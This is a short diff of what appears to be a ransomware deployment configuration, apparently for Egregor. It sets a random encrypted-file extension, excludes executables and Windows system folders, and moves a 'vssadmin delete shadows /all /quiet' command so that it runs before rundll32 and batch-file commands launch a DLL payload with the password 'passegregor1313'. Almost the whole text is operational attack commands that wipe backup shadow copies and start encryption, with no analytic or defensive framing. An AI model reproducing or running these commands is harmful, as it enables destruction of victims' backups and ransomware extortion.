@@ -1,6 +1,4 @@
 file_extension: <random.4.7>
-command:
-  - vssadmin delete shadows /all /quiet
 exclude:
   - .exe
   - .dll
@@ -9,6 +7,7 @@ exclude:
   - '%SYSTEMDRIVE%\Windows'
   - '%SYSTEMDRIVE%\ProgramData'
 command:
+  - vssadmin delete shadows /all /quiet
   - rundll32.exe C:\\Windows\\sed.dll,DllRegisterServer -passegregor1313 --full
   - rundll32.exe C:\\Windows\\sed.dll,DllRegisterServer -passegregor1313 --full
   - C:\WINDOWS\system32\cmd.exe /c e.bat -passegregor1313
